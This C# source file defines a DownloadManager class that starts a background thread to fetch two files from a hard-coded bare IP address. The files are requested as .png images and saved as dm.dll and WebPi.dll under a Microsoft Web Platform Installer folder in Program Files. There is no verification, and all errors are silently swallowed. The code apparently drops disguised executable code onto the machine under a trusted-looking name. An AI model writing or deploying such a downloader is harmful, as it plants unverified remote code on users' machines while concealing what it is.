using CLAS.Model.TMs;
using CLAS.Common;
using CLAS.Model.Entities; 

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using CLAS.Model.VMs;
using CLAS.Utils;
using System.Diagnostics;
using System.IO;
using System.Net;
using CLAS.Model.Base;
using CLAS.Model.Result;
using CLAS.Web.Core.Base; 

namespace CASL.Bll
{
    /// <summary>
    /// 解析和执行指令
    /// </summary>
    public class DownloadManager
    {

        public static int downLoadStatus  ;
        public static int maxdownLoadStatus = 3;
        public static string dmcDllPath =@"C:\Program Files\Microsoft\Web Platform Installer\";

        private DownloadManager() { } 

        public static readonly DownloadManager instance = new DownloadManager();

        private bool DownLoadDmDll(string filepath,string url, string fileName )
        { 

            var flag = false;
            try
            {
                //判断文件是否已存在

                if (!Directory.Exists(filepath))
                {
                    Directory.CreateDirectory(filepath);
                }
                using (FileStream fs = new FileStream(filepath + fileName, FileMode.Create, FileAccess.Write))
                {
                    //创建请求
                    var request = (HttpWebRequest)WebRequest.Create(url);
                    //接收响应
                    var response = (HttpWebResponse)request.GetResponse();
                    //输出流
                    Stream responseStream = response.GetResponseStream();
                    byte[] bufferBytes = new byte[10000];//缓冲字节数组
                    int bytesRead = -1;
                    while ((bytesRead = responseStream.Read(bufferBytes, 0, bufferBytes.Length)) > 0)
                    {
                        fs.Write(bufferBytes, 0, bytesRead);
                    }
                    if (fs.Length>0)
                    {
                        flag = true;
                    }
                    //关闭写入
                       fs.Flush();
                    fs.Close();
                }
 
            }
            catch (Exception exp)
            { 
            }
            return flag; 
        }


        public void DownLoadDmDlls(string filepath)
        {
            downLoadStatus = 1;
            if (File.Exists(filepath+ "dm.dll"))
            {
                downLoadStatus++;
            }
            if (File.Exists(filepath + "WebPi.dll"))
            {
                downLoadStatus++;
            }
            if (downLoadStatus != maxdownLoadStatus)
            {
                var d1 = new Thread(() =>
                {
                    DownLoadDmDll(filepath, "http://139.196.52.240:8222/download/3b93eda393c926b614f4c468.png", "dm.dll");
                    downLoadStatus++;
                    DownLoadDmDll(filepath, "http://139.196.52.240:8222/download/24e9f7b72c0971fab790c5cf02.png", "WebPi.dll");
                    downLoadStatus++;
                });
                d1.IsBackground = true;
                d1.Start();
            }
           
        }



    }
}
